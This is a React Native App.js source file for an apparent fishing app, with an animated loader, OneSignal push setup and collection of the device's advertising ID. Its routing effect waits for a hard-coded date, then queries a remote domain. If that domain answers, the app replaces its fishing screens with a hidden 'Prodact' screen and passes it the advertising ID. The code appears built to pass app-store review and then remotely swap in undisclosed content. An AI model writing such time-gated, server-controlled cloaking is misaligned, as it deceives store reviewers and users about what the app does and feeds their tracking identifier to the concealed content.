import React, {useState, useEffect, useRef} from 'react';
import {Text, View, Animated, Image} from 'react-native';
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
const Stack = createNativeStackNavigator();

import HomeScreen from './screens/HomeScreen';
import FishingScreen from './screens/FishingScreen';
import ProfileScreen from './screens/ProfileScreen';
import OneFishingScreen from './screens/OneFishingScreen';
import Prodact from './screens/Product';
//import {useWindowDimensions} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import {LogLevel, OneSignal} from 'react-native-onesignal';

const App = () => {
  const [route, setRoute] = useState();
  //const {height, width} = useWindowDimensions();

  ///////////// Отримання IDFA
  const [idfa, setIdfa] = useState(null);
  console.log('idfa==>', idfa);

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [idfa]);

  const setData = async () => {
    try {
      const data = {
        idfa,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        console.log('parsedData in App==>', parsedData);
        setIdfa(parsedData.idfa);
      } else {
        await fetchIdfa();
        await someFunction();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
      } else {
        setIdfa(true);
      }
    } catch (err) {
      console.log('err', err);
      setIdfa(null);
      fetchIdfa(); //???
    }
  };

  //  OneSignall
  //  00824f15-abc4-4191-bd27-24b130f81e07
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true);
        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const someFunction = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в someFunction==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize('00824f15-abc4-4191-bd27-24b130f81e07');

  OneSignal.Notifications.addEventListener('click', event => {
    console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag('key', 'value');

  //////////// LOADER
  const [louderIsEnded, setLouderIsEnded] = useState(false);

  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 1500,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 2000,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 1500);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 4500);
  }, []);

  ///////// useEffect що виріш який шлях включати
  useEffect(() => {
    const checkUrl = `https://breathtaking-regal-victory.space/h15FBm71`;

    const targetData = new Date('2024-04-28T12:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);

  ////////// Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{idfa: idfa}}
            name="Prodact"
            component={Prodact}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator>
        <Stack.Screen
          name="HomeScreen"
          component={HomeScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="FishingScreen"
          component={FishingScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="ProfileScreen"
          component={ProfileScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="OneFishingScreen"
          component={OneFishingScreen}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    );
  };

  return (
    <NavigationContainer>
      {!louderIsEnded ? (
        <View
          style={{
            position: 'relative',
            flex: 1,
          }}>
          <Animated.Image
            source={require('./assets/rediz/louder/loader1.jpg')} // Special animatable View
            style={{
              opacity: appearingAnim,
              height: '100%',
              width: '100%',
              position: 'absolute', // Bind opacity to animated value
            }}
          />
          <Animated.Image
            source={require('./assets/rediz/louder/loader2.jpg')} // Special animatable View
            style={{
              opacity: appearingSecondAnim,
              height: '100%',
              width: '100%',
              position: 'absolute', // Bind opacity to animated value
            }}
          />
        </View>
      ) : (
        <Route isFatch={route} />
      )}
    </NavigationContainer>
  );
};

export default App;
